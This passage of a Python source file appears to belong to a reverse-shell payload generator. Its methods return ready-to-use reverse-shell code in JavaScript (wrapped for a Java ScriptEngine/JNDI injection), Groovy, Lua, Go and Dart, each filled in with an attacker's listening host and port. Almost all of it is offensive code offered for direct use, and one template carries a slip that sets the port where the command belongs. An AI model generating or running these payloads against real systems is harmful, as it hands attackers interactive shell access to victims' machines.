     } catch( Exception e ) {}
%>
</pre>
</body>
</html>'''


	def javascript(self):
		return f'''
{TerminalColor.Orange}#JAVASCRIPT
{TerminalColor.Cyan}String command = "var host = '{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}';" +
                       "var port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};" +
                       "var cmd = '{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}';"+
                       "var s = new java.net.Socket(host, port);" +
                       "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
                       "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
                       "var po = p.getOutputStream(), so = s.getOutputStream();"+'''+'''
                       "print ('Connected');"+
                       "while (!s.isClosed()) {"+
                       "    while (pi.available() > 0)"+
                       "        so.write(pi.read());"+
                       "    while (pe.available() > 0)"+
                       "        so.write(pe.read());"+
                       "    while (si.available() > 0)"+
                       "        po.write(si.read());"+
                       "    so.flush();"+
                       "    po.flush();"+
                       "    java.lang.Thread.sleep(50);"+
                       "    try {"+
                       "        p.exitValue();"+
                       "        break;"+
                       "    }"+
                       "    catch (e) {"+
                       "    }"+
                       "}"+
                       "p.destroy();"+
                       "s.close();";
String x = "\\"\\".getClass().forName(\\"javax.script.ScriptEngineManager\\").newInstance().getEngineByName(\\"JavaScript\\").eval(\\""+command+"\\")";
ref.add(new StringRefAddr("x", x);
		'''

	def groovy(self):
		return f'''
{TerminalColor.Orange}#GROOVY
{TerminalColor.Cyan}String host="{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";int port={TerminalColor.Green}{self.lport}{TerminalColor.Cyan};String cmd="{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())'''+'''{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
		'''

	def lua(self):
		return f'''
{TerminalColor.Orange}#LUA
{TerminalColor.Cyan}lua5.1 -e 'local host, port = "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
		'''

	def golang(self):
		return f'''
{TerminalColor.Orange}#GOLANG
{TerminalColor.Cyan}echo 'package main;import"os/exec";import"net";func main()'''+'''{c,_:=net.Dial'''+f'''("tcp","{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}:{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}");cmd:=exec.Command("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}")'''+'''';cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
		'''

	def dart(self):
		return f'''
{TerminalColor.Orange}#DART
{TerminalColor.Cyan}import 'dart:io';
import 'dart:convert';'''+'''

main() {'''+f'''
  Socket.connect("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}).then((socket)'''+''' {
    socket.listen((data) {'''+f'''
      Process.start('{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}', []).then((Process process)'''+''' {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
		'''








